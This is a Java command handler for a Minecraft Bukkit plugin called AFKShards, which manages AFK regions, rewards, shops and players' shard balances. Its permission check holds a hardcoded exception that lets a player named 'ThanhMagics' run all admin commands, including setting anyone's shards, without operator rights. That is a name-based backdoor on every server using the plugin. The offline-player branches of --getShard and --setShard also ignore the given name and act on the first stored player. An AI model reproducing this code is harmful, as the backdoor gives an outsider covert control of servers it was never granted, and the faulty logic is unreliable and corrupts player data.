package org.thanhmagics.afkshards;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;

import java.math.BigDecimal;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SetupCommand implements CommandExecutor {

    @Override
    public boolean onCommand(@NotNull CommandSender commandSender, @NotNull Command command, @NotNull String s, @NotNull String[] args) {
        Player player = (Player) commandSender;
        PPlayer zplayer = AFKShards.getInstance().getPlayerMap().get(player.getUniqueId());
        if (!player.hasPermission("op")) {
            if (!player.getName().equalsIgnoreCase("ThanhMagics"))
                return true;
        }
        if (args.length == 0) {
            zplayer.sendMessage("&a&m<-----> &6&lAFKShards &e&lv0.1 &a&m <----->",
                    "&7- &d/AFKShard --cRegion &6[name]&7 : Tạo Khu Vực AFK Mới!",
                    "&7- &d/AFKShard --cReward &6[name] [perm] [rMin-rMax]&7 : Tạo Reward Mới &e(rMin = số Item tối thiểu nhận đc và ngược lại)!",
                    "&7- &d/AFKShard --addRegionReward &6[region] [reward]&7 : khi add reward vào region thì reward đó sẽ có hiệu lực trong region!",
                    "&7- &d/AFKShard --dRegion &6[name]&7 : Xóa Region!",
                    "&7- &d/AFKShard --dReward &6[name]&7 : Xóa Reward!",
                    "&7- &d/AFKShard --cShop &6[name] &7: Tạo Shop Mới!",
                    "&7- &d/AFKShard --ShopEdit &6[name] &7: Xem Commands Edit Shop",
                    "&7- &d/AFKShard --getShard &6[player] &7: số shard của player",
                    "&7- &d/AFKShard --setShard &6[player] [amount] &7: set shard của player",
                    "&3&m<---------------------------->");
        } else {
            if (args.length == 1) {
                if (args[0].equalsIgnoreCase("--cregion")) {
                    zplayer.sendMessage("&7- &d/AFKShard --cRegion &6[name]&7 : Tạo Khu Vực AFK Mới!");
                } else if (args[0].equalsIgnoreCase("--creward")) {
                    zplayer.sendMessage("&7- &d/AFKShard --cReward &6[name] [permission] [rewardMin-rewardMax]&7 : Tạo Reward Mới!");
                } else if (args[0].equalsIgnoreCase("--dregion")) {
                    zplayer.sendMessage("&7- &d/AFKShard --dRegion &6[name]&7 : Xóa Region!");
                } else if (args[0].equalsIgnoreCase("--dreward")) {
                    zplayer.sendMessage("&7- &d/AFKShard --dReward &6[name]&7 : Xóa Reward!");
                } else if (args[0].equalsIgnoreCase("--ShopEdit")) {
                    zplayer.sendMessage("&7- &d/AFKShard --ShopEdit &6[name] &7: Xem Commands Edit Shop");
                } else if (args[0].equalsIgnoreCase("--cShop")) {
                    zplayer.sendMessage("&7- &d/AFKShard --cShop &6[name] &7: Tạo Shop Mới!");
                } else if (args[0].equalsIgnoreCase("--addregionreward")) {
                    zplayer.sendMessage("&7- &d/AFKShard --addRegionReward &6[region] [reward]&7 : khi add reward vào region thì reward đó sẽ có hiệu lực trong region!");
                } else {
                    zplayer.sendMessage("&cUnknown Command!");
                }
            } else if (args.length == 2) {
                String name = args[1];
                if (Utils.isKTĐB(name)) {
                    zplayer.sendMessage("&cCommand ko đc chứa KTĐB!");
                    return true;
                }
                if (args[0].equalsIgnoreCase("--ShopEdit")) {
                    zplayer.sendMessage("","");
                    zplayer.sendMessage("&b&m<----->&5 ShopEdit &b&m<----->",
                            "&7- &c/... --title &6[name] &7: Set Title Cho GUI!",
                            "&7- &c/... --size &6[size] &7: Set Size Cho GUI (Size % 9 = 0, Size <= 54)",
                            "&7- &c/... --ci &6[id] [price] &7: Add Item Vào GUI!&e(Item Đc Add Là Item Đang Đc Cầm Trên Tay!)&7, 'id' là chỉ để thuận cho việc delete!",
                            "&7- &c/... --di &6[id]&7 : Xóa Item!",
                            "&7- &c/... --cmd &6[name]&7 : Set Command Để Mở GUI! (EX: nếu ghi vào là &etest &7 thì open command sẽ là &e/test&7)",
                            "&7- &c/... --permission &6[p]&7 : Set Permission Để Có Thể Chạy Đc Command!",
                            "&2&m<--------------------->");
                } else if (args[0].equalsIgnoreCase("--cRegion")) {
                    if (!AFKShards.getInstance().getAfkRegionMap().containsKey(name)) {
                        PlayerListeners.addPlayer(player.getUniqueId(),"1#" + name);
                        zplayer.sendMessage("&aĐập 2 Block Để Tạo 2 Pos (như world edit)");
                    } else {
                        zplayer.sendMessage("&cRegion Đã Tồn Tại!");
                    }
                } else if (args[0].equalsIgnoreCase("--cReward")) {
                    zplayer.sendMessage("&7- &d/AFKShard --cReward &6[name] [permission] [rewardMin-rewardMax]&7 : Tạo Reward Mới!");
                } else if (args[0].equalsIgnoreCase("--cShop")) {
                    if (!AFKShards.getInstance().getAfkShopMap().containsKey(name)) {
                        new AFKShop(name);
                        zplayer.sendMessage("&aCreate Success!");
                    } else {
                        zplayer.sendMessage("&cShop Đã Tồn Tại!");
                    }
                } else if (args[0].equalsIgnoreCase("--dregion")) {
                    if (AFKShards.getInstance().getAfkRegionMap().containsKey(name)) {
                        AFKShards.getInstance().getAfkRegionMap().get(name).delete();
                        zplayer.sendMessage("&aDelete Success!");
                    } else {
                        zplayer.sendMessage("&cTên Không Tồn Tại!");
                    }
                } else if (args[0].equalsIgnoreCase("--dreward")) {
                    if (AFKShards.getInstance().getAfkRewardMap().containsKey(name)) {
                        AFKShards.getInstance().getAfkRewardMap().get(name).delete();
                        zplayer.sendMessage("&aDelete Success!");
                    } else {
                        zplayer.sendMessage("&cTên Không Tồn Tại!");
                    }
                } else if (args[0].equalsIgnoreCase("--cshop")) {
                    if (AFKShards.getInstance().getAfkShopMap().containsKey(name)) {
                        zplayer.sendMessage("&c Tên Đã Tồn Tại!");
                    } else {
                        new AFKShop(name);
                        zplayer.sendMessage("&aCreate Success!");
                    }
                } else if (args[0].equalsIgnoreCase("--addRegionReward")) {
                    zplayer.sendMessage("&7- &d/AFKShard --addRegionReward &6[region] [reward]&7 : khi add reward vào region thì reward đó sẽ có hiệu lực trong region!");
                } else if (args[0].equalsIgnoreCase("--getShard")) {
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (p.getName().equalsIgnoreCase(name)) {
                            zplayer.sendMessage("&aSố Shard Của &e" + p.getName() + "&a là: &c" + AFKShards.getInstance().getPlayerFiles().getShards(
                                    AFKShards.getInstance().getPlayerMap().get(p.getUniqueId())
                            ));
                            return true;
                        }
                    }
                    for (OfflinePlayer op : Bukkit.getOfflinePlayers()) {
                        if (AFKShards.getInstance().getPlayerMap().containsKey(op.getUniqueId())) {
                            zplayer.sendMessage("&aSố Shard Của &e" + op.getName() + "&a là: &c" + AFKShards.getInstance().getPlayerFiles().getShards(
                                    AFKShards.getInstance().getPlayerMap().get(op.getUniqueId())
                            ));
                            return true;
                        }
                    }
                } else if (args[0].equalsIgnoreCase("--setShard")) {
                    zplayer.sendMessage("&7- &d/AFKShard --setShard &6[name] [amount]");
                } else {
                    zplayer.sendMessage("&cUnknown Command!");
                }
            } else if (args.length == 3) {
                if (args[0].equalsIgnoreCase("--shopedit")) {
                    zplayer.sendMessage("","");
                    zplayer.sendMessage("&b&m<-----> &5ShopEdit &b&m<----->",
                            "&7- &c/... --title &6[name] &7: Set Title Cho GUI!",
                            "&7- &c/... --size &6[size] &7: Set Size Cho GUI (Size % 9 = 0, Size <= 54)",
                            "&7- &c/... --ci &6[id] [price] &7: Add Item Vào GUI!&e(Item Đc Add Là Item Đang Đc Cầm Trên Tay!)&7, 'id' là chỉ để thuận cho việc delete!",
                            "&7- &c/... --di &6[id]&7 : Xóa Item!",
                            "&7- &c/... --cmd &6[name]&7 : Set Command Để Mở GUI! (EX: nếu ghi vào là &etest &7 thì open command sẽ là &e/test&7)",
                            "&7- &c/... --permission &6[p]&7 : Set Permission Để Có Thể Chạy Đc Command!",
                            "&2&m<--------------------->");
                } else if (args[0].equalsIgnoreCase("--creward")) {
                    zplayer.sendMessage("&7- &d/AFKShard --cReward &6[name] [permission] [rewardMin-rewardMax]&7 : Tạo Reward Mới!");
                } else if (args[0].equalsIgnoreCase("--addRegionReward")) {
                    if (AFKShards.getInstance().getAfkRegionMap().containsKey(args[1])) {
                        if (AFKShards.getInstance().getAfkRewardMap().containsKey(args[2])) {
                            AFKRegion afkRegion = AFKShards.getInstance().getAfkRegionMap().get(args[1]);
                            afkRegion.getAr().add(AFKShards.getInstance().getAfkRewardMap().get(args[2]));
                            zplayer.sendMessage("&aSuccess!");
                        } else {
                            zplayer.sendMessage("&carg[2] ko tồn tại!");
                        }
                    } else {
                        zplayer.sendMessage("&carg[1] ko tồn tại!");
                    }
                } else if (args[0].equalsIgnoreCase("--setshard")) {
                    int i;
                    try {
                        i = Integer.parseInt(args[2]);
                    } catch (Exception e) {
                        zplayer.sendMessage("&cVui Lòng Nhập Số!");
                        return true;
                    }
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (p.getName().equalsIgnoreCase(args[1])) {
                            AFKShards.getInstance().getPlayerFiles().setShards(
                                    AFKShards.getInstance().getPlayerMap().get(p.getUniqueId()),BigDecimal.valueOf(i));
                            zplayer.sendMessage("&aSet Thành Công Số Shard Của &e" + p.getName() + "&a Thành: &c" + i);
                            return true;
                        }
                    }
                    for (OfflinePlayer p : Bukkit.getOfflinePlayers()) {
                        if (AFKShards.getInstance().getPlayerMap().containsKey(p.getUniqueId())) {
                            AFKShards.getInstance().getPlayerFiles().setShards(
                                    AFKShards.getInstance().getPlayerMap().get(p.getUniqueId()),BigDecimal.valueOf(i));
                            zplayer.sendMessage("&aSet Thành Công Số Shard Của &e" + p.getName() + "&a Thành: &c" + i);
                            return true;
                        }
                    }
                } else {
                    zplayer.sendMessage("&cUnknown Command!");
                }
            } else {
                if (args[0].equalsIgnoreCase("--creward")) {
                    if (!AFKShards.getInstance().getAfkRewardMap().containsKey(args[1])) {
                        new AFKReward(args[1],args[2],args[3]);
                        zplayer.sendMessage("&aCreate Success!");
                    } else {
                        zplayer.sendMessage("&c Tên Đã Tồn Tại!");
                    }
                } else if (args[0].equalsIgnoreCase("--shopedit")) {
                    AFKShop afkShop = AFKShards.getInstance().getAfkShopMap().get(args[1]);
                    if (afkShop == null) {
                        zplayer.sendMessage("&cTên Ko Tồn Tại!"); return true;
                    }
                    if (args[2].equalsIgnoreCase("--title")) {
                        int le = args.length;
                        StringBuilder sb = new StringBuilder();
                        for (int i = 3; i < le; i++) {
                            if (!Utils.isKTĐB(args[i])) {
                                sb.append(args[i]);
                            } else {
                                zplayer.sendMessage("&4ko đc sử dụng KTĐB!");
                            }
                            sb.append(" ");
                        }
                        afkShop.setTitle(sb.toString());
                        zplayer.sendMessage("&aChange Success!");
                    } else if (args[2].equalsIgnoreCase("--size")) {
                        try {
                            int size = Integer.parseInt(args[3]);
                            if (size % 9 != 0) throw new Exception();
                            afkShop.setSize(size);
                            zplayer.sendMessage("&a Đổi Thành Công!");
                        } catch (Exception e) {
                            zplayer.sendMessage("&cVui Lòng Nhập Số Và Số Đó Chia Hết Cho 9! (dưới hoặc bằng 54)");
                        }
                    } else if (args[2].equalsIgnoreCase("--di")) {
                        if (afkShop.getGuiItems().containsKey(args[3])) {
                            afkShop.getGuiItems().remove(args[3]);
                            zplayer.sendMessage("&aDelete Success!");
                        } else {
                            zplayer.sendMessage("&cID ko tồn tại!");
                        }
                    } else if (args[2].equalsIgnoreCase("--cmd")) {
                        afkShop.setCommand(args[3]);
                        zplayer.sendMessage("&aChange Success!");
                    } else if (args[2].equalsIgnoreCase("--permission")) {
                        afkShop.setPermission(args[3]);
                        zplayer.sendMessage("&aSet Thành Công!");
                    } else if (args[2].equalsIgnoreCase("--ci")) {
                        if (!afkShop.getGuiItems().containsKey(args[3])) {
                            if (!player.getInventory().getItemInMainHand().getType().equals(Material.AIR)) {
                                try {
                                    int i = Integer.parseInt(args[4]);
                                    afkShop.getGuiItems().put(args[3],new AFKShop.GUIItem(new ItemBuilder(player.getInventory().getItemInMainHand()),null,i));
                                    zplayer.sendMessage("&aCreate Success!");
                                } catch (Exception e)  {
                                    zplayer.sendMessage("&cVui Lòng Ghi Số!");
                                }
                            } else {
                                zplayer.sendMessage("&aCầm Item trên tay!");
                            }
                        }  else {
                            zplayer.sendMessage("&cID đã tồn tại!");
                        }
                    } else {
                        zplayer.sendMessage("&cUnknown Command!");
                    }
                } else {
                    zplayer.sendMessage("&cUnknown Command!");
                }
            }
        }
        return true;
    }
}
